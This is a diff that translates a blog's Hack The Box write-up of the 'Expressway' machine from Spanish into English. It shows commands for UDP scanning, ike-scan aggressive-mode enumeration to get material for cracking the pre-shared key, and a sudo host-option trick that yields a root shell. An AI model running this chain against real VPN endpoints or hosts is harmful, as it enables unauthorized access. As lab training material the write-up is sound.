@@ -19,23 +19,23 @@
 <header class="nav">
   <a href="../../index.html" class="logo"><span class="bracket">[</span>AndrecoJS<span class="cursor">_</span><span class="bracket">]</span></a>
   <nav>
-    <a href="../../index.html#posts">publicaciones</a>
-    <a href="../../index.html#contact">contacto</a>
+    <a href="../../index.html#posts">posts</a>
+    <a href="../../index.html#contact">contact</a>
   </nav>
 </header>
 
 <main class="article">
-  <a class="back" href="../../index.html#posts">← volver a publicaciones</a>
+  <a class="back" href="../../index.html#posts">← return to posts</a>
 
   <header class="meta">
     <span class="kind">Write-up</span>
     <h1>HTB — Expressway</h1>
     <div class="sub">
-      <span>📅 14/06/2026</span>
+      <span>📅 06/14/2026</span>
       <span class="dot-sep">·</span>
-      <span>⏱️ 2 min de lectura</span>
+      <span>⏱️ 2 min read</span>
       <span class="dot-sep">·</span>
-      <span>🎯 Dificultad: Easy</span>
+      <span>🎯 Difficulty: Easy</span>
     </div>
     <div class="tags-mini">
       <span>HTB</span><span>Linux</span><span>UDP</span><span>ISAKMP</span><span>sudo abuse</span>
@@ -43,21 +43,21 @@
   </header>
 
 <p>
-La máquina Expressway presenta un escenario centrado en VPN IPsec/IKE. El acceso inicial se obtiene
-mediante la enumeración del servicio ISAKMP expuesto por UDP y la recuperación de una clave PSK.
-Posteriormente, la escalada de privilegios aprovecha una configuración específica de sudo asociada a un host virtual.
+The Expressway machine features a scenario centered on IPsec/IKE VPNs. Initial access is gained
+by enumerating the ISAKMP service exposed over UDP and retrieving a PSK.
+Subsequently, privilege escalation exploits a specific sudo configuration associated with a virtual host.
 </p>
 
-<h2>Reconocimiento</h2>
+<h2>Reconnaissance</h2>
 
-<p>El escaneo inicial con Nmap mostró únicamente SSH sobre TCP:</p>
+<p>The initial Nmap scan showed only SSH over TCP:</p>
 
 <pre><code>nmap expressway.htb -A
 
 22/tcp open ssh OpenSSH 10.0p2 Debian 8
 </code></pre>
 
-<p>Al no existir más servicios TCP relevantes, se realizó enumeración UDP:</p>
+<p>As there were no other relevant TCP services, UDP enumeration was performed:</p>
 
 <pre><code>nmap expressway.htb -sU --top-ports 100
 
@@ -68,13 +68,13 @@ Posteriormente, la escalada de privilegios aprovecha una configuración específ
 </code></pre>
 
 <p>
-El puerto 500/UDP indicaba la presencia de un servicio ISAKMP utilizado por IPsec/IKE para la negociación
-de túneles VPN seguros.
+Port 500/UDP indicated the presence of an ISAKMP service used by IPsec/IKE for negotiating
+secure VPN tunnels.
 </p>
 
-<h2>Enumeración de IKE/IPsec</h2>
+<h2>IKE/IPsec Enumeration</h2>
 
-<p>Utilizando ike-scan se confirmó el servicio y sus parámetros criptográficos:</p>
+<p>Using ike-scan, the service and its cryptographic parameters were confirmed:</p>
 
 <pre><code>ike-scan -M expressway.htb
 
@@ -83,37 +83,37 @@ VID=(XAUTH)
 </code></pre>
 
 <ul>
-<li>Autenticación mediante PSK (Pre-Shared Key).</li>
-<li>Cifrado 3DES.</li>
-<li>Hash SHA1.</li>
+<li>Authentication via PSK (Pre-Shared Key).</li>
+<li>3DES encryption.</li>
+<li>SHA1 hashing.</li>
 <li>Diffie-Hellman Group 2 (1024 bits).</li>
-<li>Soporte para XAUTH.</li>
+<li>XAUTH support.</li>
 </ul>
 
-<p>Posteriormente se lanzó una enumeración en modo agresivo:</p>
+<p>Next, an aggressive mode enumeration was performed:</p>
 
 <pre><code>ike-scan -P -M -A -n fakeID expressway.htb
 </code></pre>
 
-<p>La respuesta reveló el identificador:</p>
+<p>The response revealed the identifier:</p>
 
 <pre><code>ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
 </code></pre>
 
 <div>
-<strong>Hallazgo:</strong> Se obtuvo el usuario <code>ike</code> junto con el material necesario para realizar cracking de la PSK.
+<strong>Finding:</strong> The user <code>ike</code> was obtained, along with the material needed to crack the PSK.
 </div>
 
-<h2>Acceso inicial</h2>
+<h2>Initial access</h2>
 
 <p>
-Tras recuperar la clave PSK y completar la autenticación, fue posible establecer acceso al sistema mediante SSH
-como el usuario <code>ike</code>.
+After retrieving the PSK and completing authentication, it was possible to gain SSH access to the system
+as the user <code>ike</code>.
 </p>
 
-<h2>Enumeración local</h2>
+<h2>Local enumeration</h2>
 
-<p>Se revisaron los grupos del usuario:</p>
+<p>The user's groups were checked:</p>
 
 <pre><code>id
 
@@ -121,7 +121,7 @@ uid=1001(ike) gid=1001(ike)
 groups=1001(ike),13(proxy)
 </code></pre>
 
-<p>El grupo <code>proxy</code> permitía acceder a directorios relacionados con Squid:</p>
+<p>The <code>proxy</code> group granted access to directories related to Squid:</p>
 
 <pre><code>find / -group proxy -type d 2>/dev/null
 
@@ -130,7 +130,7 @@ groups=1001(ike),13(proxy)
 /var/log/squid
 </code></pre>
 
-<p>En los registros de acceso apareció un subdominio interesante:</p>
+<p>An interesting subdomain appeared in the access logs:</p>
 
 <pre><code>cat access.log.1 | grep htb
 
@@ -138,13 +138,13 @@ GET http://offramp.expressway.htb
 </code></pre>
 
 <p>
-Esto reveló la existencia del host virtual <code>offramp.expressway.htb</code>, pieza clave para la escalada.
+This revealed the existence of the virtual host <code>offramp.expressway.htb</code>, a key component for privilege escalation.
 </p>
 
-<h2>Escalada de privilegios</h2>
+<h2>Privilege escalation</h2>
 
 <p>
-Durante la enumeración se observó una versión reciente de sudo:
+A recent version of sudo was observed during enumeration:
 </p>
 
 <pre><code>sudo -V
@@ -153,14 +153,14 @@ Sudo version 1.9.17
 </code></pre>
 
 <p>
-Investigando configuraciones relacionadas con nombres de host se probó el parámetro <code>-h</code> apuntando
-al subdominio descubierto anteriormente:
+While investigating hostname-related configurations, the <code>-h</code> parameter was tested, pointing
+to the previously discovered subdomain:
 </p>
 
 <pre><code>sudo -h offramp.expressway.htb -l
 </code></pre>
 
-<p>La salida mostró permisos completos:</p>
+<p>The output showed full permissions:</p>
 
 <pre><code>User ike may run the following commands on offramp:
 (root) NOPASSWD: ALL
@@ -168,23 +168,29 @@ al subdominio descubierto anteriormente:
 </code></pre>
 
 <div>
-<strong>Resultado:</strong> El usuario podía ejecutar cualquier comando como root sin contraseña cuando sudo evaluaba las reglas para el host <code>offramp.expressway.htb</code>.
+<strong>Result:</strong> The user could execute any command as root without a password when sudo evaluated the rules for the host <code>offramp.expressway.htb</code>.
 </div>
 
-<p>Finalmente:</p>
+<p>Finally:</p>
 
 <pre><code>sudo -h offramp.expressway.htb /bin/bash
 </code></pre>
 
-<p>Con ello se obtuvo una shell con privilegios de root.</p>
+<p>This yielded a root-privileged shell.</p>
 
-<h2>Conclusión</h2>
+<h2>Conclusion</h2>
 
 <p>
-La cadena de ataque combinó enumeración de IKE/IPsec, recuperación de una PSK, acceso como usuario válido
-y una configuración insegura de sudo basada en hostname. La clave del compromiso fue identificar el subdominio
-oculto en los logs de Squid y utilizarlo para activar privilegios administrativos completos.
+The attack chain combined IKE/IPsec enumeration, PSK retrieval, access as a valid user,
+and an insecure hostname-based sudo configuration. The key to the compromise was identifying the
+hidden subdomain in the Squid logs and using it to trigger full administrative privileges.
 </p>
+
+<footer>
+  <p>© <span id="year"></span> Eduardo Andreco Juarez Salgado</p>
+</footer>
+
+<script>document.getElementById('year').textContent = new Date().getFullYear();</script>
 
 </body>
 </html>
